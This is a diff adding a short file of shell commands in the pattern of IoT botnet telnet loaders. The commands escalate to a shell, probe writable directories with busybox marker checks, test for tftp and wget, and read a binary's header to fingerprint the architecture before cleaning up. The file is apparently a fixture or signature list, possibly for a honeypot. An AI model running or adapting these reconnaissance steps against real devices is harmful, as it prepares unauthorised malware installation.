@@ -1,0 +1,10 @@
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox HDKII
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HDKII
+tftp; wget; /bin/busybox HDKII
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox HDKII
+rm .s; exit
